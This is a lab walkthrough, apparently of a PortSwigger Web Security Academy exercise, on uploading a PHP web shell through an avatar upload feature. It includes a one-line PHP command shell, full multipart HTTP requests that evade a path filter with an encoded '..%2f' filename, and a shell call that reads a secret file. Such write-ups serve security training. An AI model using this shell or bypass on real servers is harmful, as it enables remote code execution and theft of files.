## Web shell upload via path traversal

This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter

## Notes

- Possibility to leave a comment on a post
- File Upload feature on user account


## Resume

1. Login with wiener:peter
2. Upload **php** shell
3. RCE with **php** shell


## Solve 

The **file upload** feature is on `/my-account`, we have to login with wiener:peter. We can update our **Avatar** via file upload. We will upload our shell.php in order to RCE.

**shell.php**

```php
<?=`$_GET[0]`?>
```

If we uploaded it and try to access the **shell.php**, it will only display the file content instead of having our web shell executed. the `/files/avatars/*` folder does not execute php. To bypass this we can try to upload it inside `/files/*` using **path traversal** while uploading the shell.

To do this, we can send the `POST /my-account/avatar` request in repeater and update it like this : 

```
POST /my-account/avatar HTTP/2
Host: 0a2400d9035fc17e8177d4fd000e005a.web-security-academy.net
Cookie: session=0WCBUkT2zIwyWjMuYMlRYVPnXQkjBC7O
Content-Length: 443
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Origin: https://0a99009804661261809eea3100350093.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryy5WhIj3BCRufMAPg
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a99009804661261809eea3100350093.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


------WebKitFormBoundaryy5WhIj3BCRufMAPg
Content-Disposition: form-data; name="avatar"; filename="../shell.php"
Content-Type: application/x-php


<?=`$_GET[0]`?>

------WebKitFormBoundaryy5WhIj3BCRufMAPg
Content-Disposition: form-data; name="user"


wiener
------WebKitFormBoundaryy5WhIj3BCRufMAPg
Content-Disposition: form-data; name="csrf"



vnR1onfoZoxqvVDPqLHzAg4hv4mYyczf
------WebKitFormBoundaryy5WhIj3BCRufMAPg--
```

The answer : 

```
HTTP/2 200 OK
Date: Wed, 29 Apr 2026 10:51:02 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 130


The file avatars/shell.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

We can see in the answer that our `../` has been removed, this mean that we will need to bypass it. We can update our previous request with : 

```
POST /my-account/avatar HTTP/2
Host: 0a2400d9035fc17e8177d4fd000e005a.web-security-academy.net
Cookie: session=0WCBUkT2zIwyWjMuYMlRYVPnXQkjBC7O
Content-Length: 443
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Origin: https://0a99009804661261809eea3100350093.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryy5WhIj3BCRufMAPg
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a99009804661261809eea3100350093.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


------WebKitFormBoundaryy5WhIj3BCRufMAPg
Content-Disposition: form-data; name="avatar"; filename="..%2fshell.php"
Content-Type: application/x-php


<?=`$_GET[0]`?>

------WebKitFormBoundaryy5WhIj3BCRufMAPg
Content-Disposition: form-data; name="user"


wiener
------WebKitFormBoundaryy5WhIj3BCRufMAPg
Content-Disposition: form-data; name="csrf"



vnR1onfoZoxqvVDPqLHzAg4hv4mYyczf
------WebKitFormBoundaryy5WhIj3BCRufMAPg--
```

And now we can see in the answer that we have our `../` :

```
HTTP/2 200 OK
Date: Wed, 29 Apr 2026 10:54:29 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 133


The file avatars/../shell.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

Once it's uploaded, we can access the web shell using the path : `/files/shell.php`. In order to get `/home/carlos/secret` we can use the web shell : 

`/files/shell.php?0=cat%20/home/carlos/secret` -> "Jy3gVRbAhktfeB0nB8rj8ImXcZ50t5QY"